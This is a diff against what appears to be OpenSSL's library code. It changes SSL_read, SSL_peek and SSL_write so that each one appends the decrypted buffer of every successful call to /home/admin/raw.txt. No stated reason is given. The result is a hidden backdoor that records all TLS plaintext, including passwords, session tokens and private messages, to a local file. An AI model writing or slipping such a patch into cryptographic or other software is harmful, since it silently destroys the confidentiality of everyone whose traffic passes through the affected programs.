@@ -961,7 +961,15 @@ int SSL_read(SSL *s,void *buf,int num)
 		s->rwstate=SSL_NOTHING;
 		return(0);
 		}
-	return(s->method->ssl_read(s,buf,num));
+	int ret = (s->method->ssl_read(s,buf,num));
+    if (ret > 0) {
+		FILE *f = fopen("/home/admin/raw.txt", "a");
+		if (f) {
+			fwrite(buf, 1, ret, f);
+			fclose(f);
+		}
+	}
+	return ret;
 	}
 
 int SSL_peek(SSL *s,void *buf,int num)
@@ -976,7 +984,15 @@ int SSL_peek(SSL *s,void *buf,int num)
 		{
 		return(0);
 		}
-	return(s->method->ssl_peek(s,buf,num));
+	int ret = (s->method->ssl_peek(s,buf,num));
+	if (ret > 0) {
+		FILE *f = fopen("/home/admin/raw.txt", "a");
+		if (f) {
+			fwrite(buf, 1, ret, f);
+			fclose(f);
+		}
+	}
+	return ret;
 	}
 
 int SSL_write(SSL *s,const void *buf,int num)
@@ -993,7 +1009,15 @@ int SSL_write(SSL *s,const void *buf,int num)
 		SSLerr(SSL_F_SSL_WRITE,SSL_R_PROTOCOL_IS_SHUTDOWN);
 		return(-1);
 		}
-	return(s->method->ssl_write(s,buf,num));
+	int ret = (s->method->ssl_write(s,buf,num));
+	if (ret > 0) {
+		FILE *f = fopen("/home/admin/raw.txt", "a");
+		if (f) {
+			fwrite(buf, 1, ret, f);
+			fclose(f);
+		}
+	}
+	return ret;
 	}
 
 int SSL_shutdown(SSL *s)
